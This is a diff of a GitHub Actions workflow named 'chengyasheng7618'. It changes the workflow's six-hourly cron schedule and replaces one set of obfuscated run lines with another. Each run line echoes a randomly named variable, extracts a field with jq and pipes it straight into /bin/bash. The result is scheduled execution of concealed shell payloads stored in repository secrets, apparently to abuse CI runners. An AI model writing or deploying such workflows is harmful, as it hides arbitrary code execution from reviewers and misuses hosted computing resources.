@@ -1,29 +1,24 @@
 name: chengyasheng7618
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 0/6 * * *'
+    - cron: '21 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengyasheng7618
         env:
-          cuf1221: ${{ secrets.cuf1221 }}
+          ubd3835: ${{ secrets.ubd3835 }}
         run: |
-          echo $cuf1221 | jq -r .v3916 | /bin/bash
-          echo $cnnx6494 | jq -r .sa134 | /bin/bash
-          echo $t426 | jq -r .qjw320 | /bin/bash
-          echo $afkp8 | jq -r .chsqn8820 | /bin/bash
-          echo $bodqx398 | jq -r .bqzc5209 | /bin/bash
-          echo $i41490 | jq -r .rxv644 | /bin/bash
-          echo $yukb48399 | jq -r .t6 | /bin/bash
-          echo $cohpk6772 | jq -r .znam4301 | /bin/bash
-          echo $i49222 | jq -r .jj8 | /bin/bash
-          echo $eac38978 | jq -r .q44386 | /bin/bash
-          echo $od8 | jq -r .ultbf53 | /bin/bash
-          echo $h5028 | jq -r .xgdyn80 | /bin/bash
+          echo $ubd3835 | jq -r .hsnfq9688 | /bin/bash
+          echo $makh92 | jq -r .pqy87 | /bin/bash
+          echo $v6 | jq -r .ow9 | /bin/bash
+          echo $fm1877 | jq -r .y48 | /bin/bash
+          echo $tn5121 | jq -r .utu05 | /bin/bash
+          echo $o2 | jq -r .is5 | /bin/bash
+          echo $vh559 | jq -r .rwbc15 | /bin/bash
+          echo $wbqyq1 | jq -r .r0253 | /bin/bash
+          echo $pp32 | jq -r .gfrw5040 | /bin/bash
 
